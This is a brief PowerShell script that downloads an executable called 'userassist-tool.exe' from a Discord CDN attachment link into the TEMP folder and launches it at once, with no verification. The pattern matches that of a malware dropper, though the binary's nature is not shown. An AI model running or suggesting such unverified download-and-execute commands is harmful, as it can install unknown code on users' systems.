$url = 'https://cdn.discordapp.com/attachments/1302269140236636201/1302275924133412934/userassist-tool.exe?ex=67278677&is=672634f7&hm=ed7d3eb713acef0e2a37448151fcf6d36482e3266803e30fc500f46dfdc1a848&'
$outputFile = "$env:TEMP\userassist.exe"

Invoke-WebRequest -Uri $url -OutFile $outputFile

Start-Process -FilePath $outputFile
